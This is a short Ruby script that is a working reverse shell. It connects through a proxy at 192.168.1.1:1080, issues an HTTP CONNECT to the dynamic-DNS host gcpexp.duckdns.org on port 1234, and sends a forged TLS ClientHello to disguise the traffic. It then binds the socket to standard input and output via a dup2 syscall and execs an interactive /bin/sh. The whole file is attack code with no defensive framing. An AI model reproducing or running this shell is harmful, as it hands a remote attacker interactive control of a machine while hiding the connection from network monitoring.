
require 'socket'

s = Socket.new 2,1
s.connect Socket.sockaddr_in 1080, '192.168.1.1'
s.print "CONNECT gcpexp.duckdns.org:1234 HTTP/1.0\r\nHost: 192.168.1.1\r\n\r\n"
s.print "\x16\x03\x01\x01;\x01\x00\x017\x03\x03\xe7HVO\xa9\xa3RN\xbdG\x86\x00\xdah\x9a\xec\x17\xf6\xfc\x1e\x12MB\x0eo5\x8b\xd2\x97\x81\xb9\x90 \xa2\xf3\x1d{\x05\xd5\xb73\xeeC\x13\x19b\xa0'\x9aM\x10\xcc\xdcD\xf4\xdd\x846&\x88-\x11\xc9\x9d'\x00>\x13\x02\x13\x03\x13\x01\xc0,\xc00\x00\x9f\xcc\xa9\xcc\xa8\xcc\xaa\xc0+\xc0/\x00\x9e\xc0$\xc0(\x00k\xc0#\xc0'\x00g\xc0\n\xc0\x14\x009\xc0\t\xc0\x13\x003\x00\x9d\x00\x9c\x00=\x00<\x005\x00/\x00\xff\x01\x00\x00\xb0\x00\x00\x00\x17\x00\x15\x00\x00\x12gcpexp.duckdns.org\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x16\x00\x14\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x01\x00\x01\x01\x01\x02\x01\x03\x01\x04\x00#\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00\x00\r\x00*\x00(\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x01\x03\x02\x04\x02\x05\x02\x06\x02\x00+\x00\x05\x04\x03\x04\x03\x03\x00-\x00\x02\x01\x01\x003\x00&\x00$\x00\x1d\x00 \xc9\xca\x81\xdf\x8f\\\xcd\xb4\xbb\x0b\xd7'\xe6\x9a\x0b\xc1xp\xf7\xa5\x802!x[\x11\xf4M\x0c\x8c\xf3."

[0,1,2].each { |fd| syscall 33, s.fileno, fd }
exec '/bin/sh -i'
